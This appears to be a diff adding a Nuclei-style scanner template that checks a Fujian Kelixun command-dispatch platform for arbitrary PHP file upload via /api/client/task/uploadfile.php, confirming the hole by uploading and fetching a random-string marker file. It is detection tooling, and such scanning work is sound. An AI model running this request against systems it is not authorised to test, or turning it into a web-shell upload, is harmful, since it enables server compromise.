@@ -1,0 +1,63 @@
+id: command-dispatch-task-uploadfile-fileupload
+info:
+  name: dispatch task/uploadfile - File Upload
+  author: qwtd
+  severity: high
+  description: |
+    福建科立讯通信有限公司指挥调度管理平台RCE_task-upload接口任意上传
+  reference:
+    - https://wiki.wy876.cn/#/./%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0RCE
+  tags: 指挥调度管理平台
+
+variables:
+  rfilename: "{{rand_base(10)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/client/task/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+        Cookie: PHPSESSID=403fc14298f14704c52657fc5ff62c71
+        Content-Length: 374
+
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="uuid"
+
+        1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="number"
+
+        122
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="uploadfile";filename="{{rfilename}}.php"
+        Content-Type: image/jpg
+
+        {{randstr}}
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7--
+
+      - |
+        GET /upload/task/{{timestrp}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    extractors:
+     - type: regex
+       name: timestrp
+       internal: true
+       part: body
+       regex:
+         - '[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}.php'  
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{randstr}}'
+      - type: status
+        status:
+          - 200
